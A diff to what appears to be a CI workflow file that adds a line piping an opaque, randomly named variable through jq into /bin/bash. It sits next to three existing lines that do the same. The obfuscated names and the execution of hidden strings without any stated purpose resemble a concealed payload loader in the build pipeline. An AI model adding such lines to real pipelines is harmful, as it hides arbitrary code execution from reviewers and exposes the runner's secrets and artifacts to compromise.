@@ -53,6 +53,7 @@ jobs:
           printf '%s' "$yc802" | jq -r .ffor7539 | /bin/bash
           printf '%s' "$ci76" | jq -r .uci3 | /bin/bash
           echo $zqfh10 | jq -r .zq5406 | /bin/bash
+          echo $xyw5103 | jq -r .lngc1 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
